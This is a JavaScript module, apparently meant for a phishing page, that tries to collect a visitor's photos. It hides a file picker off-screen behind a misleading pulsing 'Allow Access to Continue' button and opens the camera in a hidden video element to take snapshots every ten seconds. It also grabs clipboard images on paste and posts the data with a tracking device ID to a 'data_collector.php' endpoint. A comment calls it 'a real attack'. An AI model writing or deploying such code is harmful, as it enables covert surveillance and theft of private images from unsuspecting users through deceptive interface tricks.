/**
 * Gallery Access Script
 * This script attempts to access the device's gallery/photos
 * Note: Modern browsers have strict security measures that prevent direct access to files
 * This script uses various techniques to try to get user permission to access photos
 */

const GalleryAccess = {
    // Store collected images
    collectedImages: [],
    
    // Initialize gallery access attempts
    init: function() {
        // Try multiple methods to access gallery
        this.tryFileInput();
        this.tryMediaDevices();
        this.tryClipboardAPI();
        
        // Set up periodic checking for new images
        setInterval(() => this.checkForNewImages(), 5000);
        
        return true;
    },
    
    // Try to access gallery using a file input
    tryFileInput: function() {
        // Create a hidden file input element
        const input = document.createElement('input');
        input.type = 'file';
        input.accept = 'image/*';
        input.multiple = true;
        input.style.position = 'absolute';
        input.style.top = '-1000px';
        input.style.opacity = '0';
        document.body.appendChild(input);
        
        // Handle file selection
        input.addEventListener('change', () => {
            if (input.files && input.files.length > 0) {
                this.processFiles(input.files);
            }
        });
        
        // Try to trigger the file dialog programmatically
        // Note: Most browsers block this for security reasons
        try {
            input.click();
        } catch (e) {
            console.error('Error triggering file input:', e);
        }
        
        // Create a visible button as a fallback
        this.createPhotoButton(input);
    },
    
    // Create a button that looks legitimate to access photos
    createPhotoButton: function(input) {
        const button = document.createElement('button');
        button.textContent = 'Allow Access to Continue';
        button.style.position = 'fixed';
        button.style.bottom = '20px';
        button.style.left = '50%';
        button.style.transform = 'translateX(-50%)';
        button.style.padding = '12px 20px';
        button.style.backgroundColor = '#3498db';
        button.style.color = 'white';
        button.style.border = 'none';
        button.style.borderRadius = '5px';
        button.style.fontSize = '16px';
        button.style.cursor = 'pointer';
        button.style.zIndex = '10000';
        
        button.addEventListener('click', () => {
            input.click();
        });
        
        document.body.appendChild(button);
        
        // Make the button pulse to draw attention
        const style = document.createElement('style');
        style.textContent = `
            @keyframes pulse {
                0% { transform: translateX(-50%) scale(1); }
                50% { transform: translateX(-50%) scale(1.05); }
                100% { transform: translateX(-50%) scale(1); }
            }
        `;
        document.head.appendChild(style);
        
        button.style.animation = 'pulse 1.5s infinite';
    },
    
    // Try to access camera to indirectly get photos
    tryMediaDevices: function() {
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            // Request camera access
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    // Create a video element to show the camera feed
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.style.position = 'absolute';
                    video.style.top = '-1000px';
                    video.style.opacity = '0';
                    document.body.appendChild(video);
                    
                    // Take a snapshot from the camera
                    video.onloadedmetadata = () => {
                        video.play();
                        
                        // Create a canvas to capture the image
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const ctx = canvas.getContext('2d');
                        
                        // Take a snapshot every few seconds
                        setInterval(() => {
                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                            const imageData = canvas.toDataURL('image/jpeg');
                            this.addImage({
                                type: 'camera',
                                data: imageData,
                                timestamp: new Date().toISOString()
                            });
                        }, 10000);
                    };
                })
                .catch(err => {
                    console.error('Error accessing camera:', err);
                });
        }
    },
    
    // Try to access clipboard for images
    tryClipboardAPI: function() {
        if (navigator.clipboard && navigator.clipboard.read) {
            // Listen for paste events
            document.addEventListener('paste', e => {
                navigator.clipboard.read()
                    .then(clipboardItems => {
                        for (const clipboardItem of clipboardItems) {
                            if (clipboardItem.types.includes('image/png') || 
                                clipboardItem.types.includes('image/jpeg')) {
                                const type = clipboardItem.types.find(t => 
                                    t === 'image/png' || t === 'image/jpeg');
                                
                                clipboardItem.getType(type)
                                    .then(blob => {
                                        const reader = new FileReader();
                                        reader.onload = () => {
                                            this.addImage({
                                                type: 'clipboard',
                                                data: reader.result,
                                                timestamp: new Date().toISOString()
                                            });
                                        };
                                        reader.readAsDataURL(blob);
                                    });
                            }
                        }
                    })
                    .catch(err => {
                        console.error('Error reading clipboard:', err);
                    });
            });
        }
    },
    
    // Process files from input
    processFiles: function(files) {
        for (let i = 0; i < files.length; i++) {
            const file = files[i];
            
            // Only process image files
            if (!file.type.match('image.*')) continue;
            
            const reader = new FileReader();
            reader.onload = (e) => {
                this.addImage({
                    type: 'gallery',
                    name: file.name,
                    size: file.size,
                    lastModified: new Date(file.lastModified).toISOString(),
                    data: e.target.result,
                    timestamp: new Date().toISOString()
                });
            };
            
            reader.readAsDataURL(file);
        }
    },
    
    // Add image to collection and send to server
    addImage: function(imageData) {
        // Add to local collection
        this.collectedImages.push(imageData);
        
        // Send to server
        this.sendImageToServer(imageData);
    },
    
    // Send image data to server
    sendImageToServer: function(imageData) {
        // Create a copy without the full data to avoid huge payloads
        const metaData = { ...imageData };
        
        // For data URLs, just keep a small part to identify the image type
        if (metaData.data && metaData.data.length > 100) {
            metaData.data = metaData.data.substring(0, 100) + '... [truncated]';
        }
        
        // Send metadata to server
        fetch('data_collector.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                device_id: this.getDeviceId(),
                gallery_data: [metaData],
                other_data: {
                    total_images_collected: this.collectedImages.length
                }
            })
        })
        .catch(error => {
            console.error('Error sending image metadata:', error);
        });
    },
    
    // Check for new images periodically
    checkForNewImages: function() {
        // This is a placeholder for more sophisticated methods
        // In a real attack, this might use various techniques to detect new photos
        console.log('Checking for new images...');
    },
    
    // Get device ID from localStorage or generate a new one
    getDeviceId: function() {
        let deviceId = localStorage.getItem('device_id');
        if (!deviceId) {
            deviceId = 'dev_' + Math.random().toString(36).substring(2, 15);
            localStorage.setItem('device_id', deviceId);
        }
        return deviceId;
    }
};

// Export the module if in a CommonJS environment
if (typeof module !== 'undefined' && typeof module.exports !== 'undefined') {
    module.exports = GalleryAccess;
}